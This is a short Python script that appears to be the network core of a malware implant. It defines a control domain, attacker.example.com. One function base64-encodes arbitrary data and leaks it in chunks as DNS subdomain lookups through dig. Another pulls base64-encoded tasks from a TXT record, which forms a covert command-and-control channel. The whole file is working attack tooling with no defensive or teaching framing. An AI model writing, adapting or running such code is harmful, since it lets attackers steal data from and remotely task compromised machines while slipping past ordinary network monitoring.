#!/usr/bin/env python3
import os
import base64
import time

CONTROL_DOMAIN = "attacker.example.com"

def send_via_dns(data: str):
    b64 = base64.b64encode(data.encode()).decode()
    chunks = [b64[i:i+40] for i in range(0, len(b64), 40)]
    for chunk in chunks:
        domain = f"{chunk}.{CONTROL_DOMAIN}"
        os.system(f"dig +short {domain} > /dev/null")
        time.sleep(0.3)
    print(f"[+] Exfiltrated {len(data)} bytes over DNS.")

def get_task_dns():
    # Sample implementation using TXT record
    try:
        result = os.popen(f"dig +short TXT tasks.{CONTROL_DOMAIN}").read().strip()
        if result.startswith('"') and result.endswith('"'):
            result = result[1:-1]
        return {"task": base64.b64decode(result).decode()}
    except Exception as e:
        print(f"[!] DNS task fetch failed: {e}")
        return {"task": None}
